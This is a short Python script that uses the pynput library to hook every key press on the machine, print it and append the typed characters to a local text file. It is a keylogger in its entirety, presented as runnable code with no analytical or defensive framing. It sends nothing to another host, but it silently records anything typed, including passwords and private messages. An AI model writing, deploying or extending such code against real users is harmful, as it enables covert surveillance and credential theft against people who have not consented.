from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("file.txt", "a") as file :
        try:
            file.write(key.char)
        except:
            print("error :3")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()